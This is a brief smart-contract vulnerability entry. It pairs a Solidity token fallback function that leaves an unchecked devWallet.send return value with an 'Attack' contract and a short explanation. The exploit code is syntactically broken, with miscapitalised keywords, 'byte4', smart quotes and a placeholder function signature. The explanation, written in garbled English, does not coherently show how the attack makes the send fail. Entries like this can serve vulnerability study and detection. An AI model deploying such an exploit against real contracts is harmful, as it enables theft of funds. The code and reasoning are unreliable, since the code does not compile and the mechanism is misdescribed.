## Vulnerable Code

```javascript
 function() payable{
        ethInWei = ethInWei + msg.value;
        uint256 amount = msg.value * STRTToEth;
        if (balances[devWallet] < amount) {return;}//require
        balances[devWallet] = balances[devWallet] - amount;
        balances[msg.sender] = balances[msg.sender] + amount;
        Transfer(devWallet, msg.sender, amount);
        devWallet.send(msg.value);  //Vulnerable position 
}
```



## Exploit Code

```javascript
Contract Attack{
    address victimAddress;
    function setVictim(address  _victim){
        victimAddress = _victim;
    }

    function startAttack(){
        victimAddress.call(byte4(keccak256(“xxxxxx()”)));
    }

    function(){
        revert();
    }
}
```



##  Sophisticated Vulnerability Description
Note the location of comment of vulnerability position.Due to 'Unchecked Low level Call' so if an malicious contract -"Attack" to call mehtod-'xxxxxx', as we looked that.the location of comment of vulnerability position is possible failed.but have not chacked the return value.so progrem will continue.it is danger.ps:'xxxxx' represent  an function signature that can not find in Victim Contract.
